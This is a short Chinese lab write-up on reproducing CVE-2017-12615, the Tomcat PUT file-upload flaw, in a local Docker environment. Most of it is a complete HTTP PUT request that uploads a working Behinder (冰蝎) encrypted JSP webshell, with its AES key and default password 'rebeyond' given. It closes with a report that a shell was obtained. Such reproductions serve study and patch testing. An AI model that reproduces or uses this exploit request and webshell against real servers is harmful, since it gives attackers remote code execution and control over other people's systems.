# 【CVE-2017-12615】Tomcat PUT上传漏洞

### 漏洞描述

​	CVE-2017-12615对应的漏洞为任意文件写入，由于配置不当(非默认配置)，导致可以使用PUT方法上传任意文件。

### 漏洞原理

​	在Tomcat配置文件设置了PUT上传方法，在web.xml文件，可以发现默认readonly为 true，当readonly 设置为 false 时，可以通过 PUT/DELETE 进行文件操控。

### 漏洞复现

- 先在kali中启动docker镜像

  ![image-20240628155359766](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240628155359766.png)

- 看到默认界面则启动成功

  ![image-20240628155537858](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240628155537858.png)

- 直接使用BurpSuit发送PUT请求构造Payload,点击发送即可，显示201即上传成功。

  ```
  PUT /shell.jSP/ HTTP/1.1 
  Host:192.168.41.132:8080
  Accept:*/*
  accept-Language:en
  User-Agent:Mozilla/5.0(compatible:SIE9.0:Windows NT 6.1:Win64:x64:Trident/5.0)
  Connection:close
  Content-Type:application/x-www-form-urlencoded
  Content-Length:5
  
  <%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
  ```

![image-20240628160405935](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240628160405935.png)

- 直接冰蝎直连，getshell成功。

  ![image-20240628160622866](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240628160622866.png)